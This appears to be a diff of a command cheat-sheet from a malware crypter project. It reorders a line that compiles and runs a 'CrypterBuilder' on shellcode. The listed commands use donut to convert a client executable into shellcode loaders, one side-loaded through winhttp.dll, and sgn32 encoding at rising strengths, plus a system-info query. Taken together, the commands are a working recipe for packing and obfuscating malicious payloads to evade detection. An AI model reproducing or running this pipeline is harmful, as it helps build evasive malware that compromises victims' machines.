@@ -1,5 +1,3 @@
-csc.exe /optimize+ /out:CrypterBuilder.exe Program.cs (use this command to compile program.cs which is the builder, and to use the builder do .\CrypterBuilder.exe .\shellcode.bin template.cpp with option -debug or -keep args)
-
 donut.exe -i Client-built.exe -x2 -a2 -o loader.bin -z3 -b3
 donut.exe -i Client-built.exe -a2 -b3 -x2 -n winhttp.dll -o loader.bin -z3
 
@@ -8,6 +6,9 @@ sgn32.exe -i payload.bin -o normal_payload.bin -a 64 -c 1 -M 50
 sgn32.exe -i payload.bin -o high_payload.bin -a 64 -c 2 -M 200
 sgn32.exe -i payload.bin -o max_payload.bin -a 64 -c 5 -M 2000
 
+csc.exe /optimize+ /out:CrypterBuilder.exe Program.cs (use this command to compile program.cs which is the builder, and to use the builder do .\CrypterBuilder.exe .\shellcode.bin template.cpp with option -debug or -keep args)
+
 CrypterBuilder.exe shellcode.bin template.cpp
 
 Get-ComputerInfo | Select-Object OsName, OsVersion, OsBuildNumber
+
